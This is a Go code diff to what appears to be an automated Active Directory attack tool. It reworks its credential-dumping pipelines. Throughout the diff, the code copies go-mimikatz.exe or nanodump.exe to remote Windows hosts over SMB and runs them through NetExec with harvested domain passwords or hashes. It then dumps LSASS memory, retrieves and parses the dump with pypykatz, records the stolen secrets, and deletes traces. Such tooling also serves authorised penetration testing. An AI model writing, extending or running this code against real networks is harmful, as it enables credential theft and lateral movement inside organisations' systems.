@@ -340,12 +340,14 @@ func selectTarget(state *core.ADState, preferred string) (core.Host, bool) {
 }
 
 func getCredential(state *core.ADState) (string, string, string, string) {
-	for _, c := range state.Creds {
+	for i := len(state.Creds) - 1; i >= 0; i-- {
+		c := state.Creds[i]
 		if c.Validated && c.Domain != "" && c.Username != "" {
 			return c.Domain, c.Username, c.Secret, c.Hash
 		}
 	}
-	for _, c := range state.Creds {
+	for i := len(state.Creds) - 1; i >= 0; i-- {
+		c := state.Creds[i]
 		if c.Domain != "" && c.Username != "" {
 			return c.Domain, c.Username, c.Secret, c.Hash
 		}
@@ -355,52 +357,54 @@ func getCredential(state *core.ADState) (string, string, string, string) {
 
 func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
 	result := &core.ToolResult{Success: true}
-	domain, _, pass, _ := getCredential(state)
-
-	if !tools.GoMimikatz.Available() {
-		// Fall back to nanodump if go-mimikatz is not installed
-		if tools.Nanodump.Available() {
-			fmt.Println("[*] go-mimikatz not available, falling back to nanodump pipeline...")
-			return executeNanodumpPipeline(state, host, pipeline, exec)
-		}
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "go-mimikatz", Key: "status", Value: "tool not available",
-		})
-		result.Success = false
-		return result
-	}
-
-	mcfg := tools.DefaultGoMimikatzConfig()
+	domain, user, pass, hash := getCredential(state)
 
 	ctx := context.Background()
 
 	if pipeline.RemoteExec && domain != "" && pass != "" {
-		fmt.Printf("[*] Remote exec go-mimikatz on %s via NetExec...\n", host.IP)
-		safeCmd := sanitizeMimikatzCommand(mcfg.Command)
-		r := exec.Execute(ctx, core.Action{
-			Artifact: fmt.Sprintf("go-mimikatz %s", safeCmd),
-			Method:   "command", Timeout: 60 * time.Second,
+		fmt.Printf("[*] Deploying go-mimikatz to %s via SMB...\n", host.IP)
+		remoteDir := `C:\Windows\Temp\`
+		deployR := exec.Execute(ctx, core.Action{
+			Artifact: "go-mimikatz.exe", Method: "put",
+			Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
 		})
-		if r.Success {
-			creds := pipeline.ParseFn(r.Output)
-			result.Creds = append(result.Creds, creds...)
-			for _, c := range creds {
-				result.Evidence = append(result.Evidence, core.EvidenceEntry{
-					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-					Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
-					Value: c.Secret, Confidence: 0.7, RawOutput: r.Output,
-					Timestamp: time.Now(),
-				})
-			}
-		} else {
-			result.Success = false
+		if !deployR.Success {
+			fmt.Println("[!] Failed to deploy go-mimikatz.exe, falling back to nanodump")
+			return executeNanodumpPipeline(state, host, pipeline, exec)
+		}
+		remotePath := deployR.Output
+
+		defer exec.Execute(ctx, core.Action{
+			Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
+		})
+
+		mcfg := tools.DefaultGoMimikatzConfig()
+		safeCmd := sanitizeMimikatzCommand(mcfg.Command)
+		cmd := fmt.Sprintf(`%s %s`, remotePath, safeCmd)
+
+		target := tools.NetExecTarget{
+			Protocol: "smb", Host: host.IP,
+			Domain: domain, Username: user, Password: pass, Hash: hash,
+		}
+
+		cr, err := tools.NetExec.Run(ctx, target, "-x", []string{cmd})
+		if err != nil || !cr.Success {
+			fmt.Println("[!] go-mimikatz remote execution failed, falling back to nanodump")
+			return executeNanodumpPipeline(state, host, pipeline, exec)
+		}
+
+		creds := pipeline.ParseFn(cr.Stdout)
+		result.Creds = append(result.Creds, creds...)
+		for _, c := range creds {
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-				Source: "go-mimikatz", Key: "error",
-				Value:     "remote execution failed",
+				Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
+				Value: c.Secret, Confidence: 0.8, RawOutput: cr.Stdout,
 				Timestamp: time.Now(),
 			})
+		}
+		if len(creds) > 0 {
+			fmt.Printf("[+] go-mimikatz: %d credential(s) from %s\n", len(creds), host.IP)
 		}
 		return result
 	}
@@ -408,21 +412,17 @@ func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	fmt.Println("[*] Running go-mimikatz locally...")
 	r, err := tools.GoMimikatz.Sekurlsa(ctx, tools.ExecutionRequest{})
 	if err != nil || r == nil || !r.Success {
-		result.Success = false
-		if r != nil {
-			result.RawOutput = r.Stdout
-		}
-		return result
+		fmt.Println("[!] go-mimikatz local execution failed, falling back to nanodump")
+		return executeNanodumpPipeline(state, host, pipeline, exec)
 	}
 
-	result.Success = true
 	creds := pipeline.ParseFn(r.Stdout)
 	result.Creds = append(result.Creds, creds...)
 	for _, c := range creds {
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 			Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
-			Value: c.Secret, Confidence: 0.7, RawOutput: r.Stdout,
+			Value: c.Secret, Confidence: 0.8, RawOutput: r.Stdout,
 			Timestamp: time.Now(),
 		})
 	}
@@ -432,7 +432,7 @@ func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline Pipel
 
 func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
 	result := &core.ToolResult{Success: true}
-	domain, _, pass, _ := getCredential(state)
+	domain, user, pass, hash := getCredential(state)
 
 	if !tools.Nanodump.Available() {
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
@@ -450,38 +450,56 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	ctx := context.Background()
 
 	if pipeline.RemoteExec && domain != "" && pass != "" {
-		fmt.Printf("[*] Remote nanodump on %s via NetExec SMB...\n", host.IP)
-
-		remotePath := fmt.Sprintf(`C:\Windows\Temp\lsass_%d.dmp`, time.Now().Unix())
-		ncfg.Output = remotePath
-
-		cmd := fmt.Sprintf("nanodump --write %s --fork", remotePath)
-		r := exec.Execute(ctx, core.Action{
-			Artifact: cmd, Method: "command", Timeout: 90 * time.Second,
+		fmt.Printf("[*] Deploying nanodump.exe to %s via SMB...\n", host.IP)
+		remoteDir := `C:\Windows\Temp\`
+		deployR := exec.Execute(ctx, core.Action{
+			Artifact: "nanodump.exe", Method: "put",
+			Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
 		})
-		if !r.Success {
-			errMsg := r.Error
-			if errMsg == "" {
-				errMsg = r.Stderr
-			}
-			fmt.Printf("[!] Remote execution failed: %s\n", errMsg)
+		if !deployR.Success {
+			fmt.Println("[!] Failed to deploy nanodump.exe")
 			result.Success = false
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 				Source: "nanodump", Key: "error",
-				Value:     "remote execution failed: " + errMsg,
+				Value:     "deploy failed: " + deployR.Error,
 				Timestamp: time.Now(),
 			})
+			return result
+		}
+		ndPath := deployR.Output
+
+		dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_%d.dmp`, time.Now().UnixNano())
+		ncfg.Output = dumpRemote
+
+		cmd := fmt.Sprintf(`%s --write %s --fork`, ndPath, dumpRemote)
+		target := tools.NetExecTarget{
+			Protocol: "smb", Host: host.IP,
+			Domain: domain, Username: user, Password: pass, Hash: hash,
+		}
+		cr, err := tools.NetExec.Run(ctx, target, "-x", []string{cmd})
+		if err != nil || !cr.Success {
+			exec.Execute(ctx, core.Action{
+				Method: "cleanup", Arguments: []string{ndPath, dumpRemote}, Timeout: 15 * time.Second,
+			})
+			fmt.Println("[!] nanodump remote execution failed")
+			result.Success = false
 			return result
 		}
 
 		fmt.Println("[*] Retrieving dump via SMB...")
 		localPath := fmt.Sprintf("/tmp/lsass_remote_%d.dmp", time.Now().Unix())
 		getR := exec.Execute(ctx, core.Action{
-			Artifact: remotePath, Method: "get",
+			Artifact: dumpRemote, Method: "get",
 			Arguments: []string{localPath}, Timeout: 60 * time.Second,
 		})
+
+		exec.Execute(ctx, core.Action{
+			Method: "cleanup", Arguments: []string{ndPath, dumpRemote}, Timeout: 15 * time.Second,
+		})
+
 		if getR.Success {
+			defer os.Remove(localPath)
 			fmt.Printf("[*] Parsing dump with pypykatz...\n")
 			parsed, err := tools.Nanodump.ParseDump(ctx, localPath)
 			if err != nil {
@@ -489,10 +507,28 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 				if pyr.Success {
 					creds := pipeline.ParseFn(pyr.Stdout)
 					result.Creds = append(result.Creds, creds...)
+					for _, c := range creds {
+						result.Evidence = append(result.Evidence, core.EvidenceEntry{
+							Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+							Source: "nanodump", Key: c.Username + "@" + c.Domain,
+							Value: c.Secret, Confidence: 0.85, RawOutput: pyr.Stdout,
+							Timestamp: time.Now(),
+						})
+					}
+					fmt.Printf("[+] nanodump: %d credential(s) from %s\n", len(creds), host.IP)
 				}
 			} else if parsed.Success {
 				creds := pipeline.ParseFn(parsed.Stdout)
 				result.Creds = append(result.Creds, creds...)
+				for _, c := range creds {
+					result.Evidence = append(result.Evidence, core.EvidenceEntry{
+						Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+						Source: "nanodump", Key: c.Username + "@" + c.Domain,
+						Value: c.Secret, Confidence: 0.85, RawOutput: parsed.Stdout,
+						Timestamp: time.Now(),
+					})
+				}
+				fmt.Printf("[+] nanodump: %d credential(s) from %s\n", len(creds), host.IP)
 			}
 		}
 		return result
